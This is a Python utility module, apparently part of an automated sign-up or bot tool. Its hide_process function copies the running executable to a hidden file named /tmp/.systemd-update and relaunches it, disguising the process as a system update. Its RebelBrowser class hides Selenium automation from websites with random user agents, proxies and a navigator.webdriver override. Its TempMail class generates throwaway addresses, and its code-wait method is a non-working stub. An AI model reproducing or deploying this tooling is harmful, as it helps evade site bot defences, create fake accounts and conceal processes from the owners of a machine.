import os
import sys
import time
import random
import string
import subprocess
import logging
from fake_useragent import UserAgent
import undetected_chromedriver as uc
from selenium import webdriver

logger = logging.getLogger('Utils')

def self_destruct():
    logger.warning("SELF DESTRUCT INITIATED")
    sys.exit(0)

def check_root():
    if os.geteuid() != 0:
        logger.error("Root required. Exiting.")
        sys.exit(1)

def hide_process():
    if os.name == 'posix':
        try:
            subprocess.run(["cp", "/proc/self/exe", "/tmp/.systemd-update"])
            subprocess.Popen(["/tmp/.systemd-update"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit(0)
        except:
            pass

class RebelBrowser:
    def __init__(self, headless=True, proxy=None):
        self.headless = headless
        self.proxy = proxy
        self.driver = None
        self.ua = UserAgent()

    def start(self):
        try:
            options = uc.ChromeOptions()
            if self.headless:
                options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument(f'--user-agent={self.ua.random}')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            if self.proxy:
                proxy_str = self.proxy.get('http', '').replace('http://', '').replace('https://', '')
                options.add_argument(f'--proxy-server={proxy_str}')
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)

            self.driver = uc.Chrome(options=options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return self.driver
        except Exception as e:
            logger.error(f"Browser start failed: {e}")
            return None

    def quit(self):
        if self.driver:
            self.driver.quit()

class TempMail:
    def __init__(self, domain='guerrillamail.com'):
        self.domain = domain
        self.email = None

    def get_email(self):
        local = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        self.email = f"{local}@{self.domain}"
        return self.email

    def wait_for_code(self, timeout=120):
        time.sleep(5)
        return None
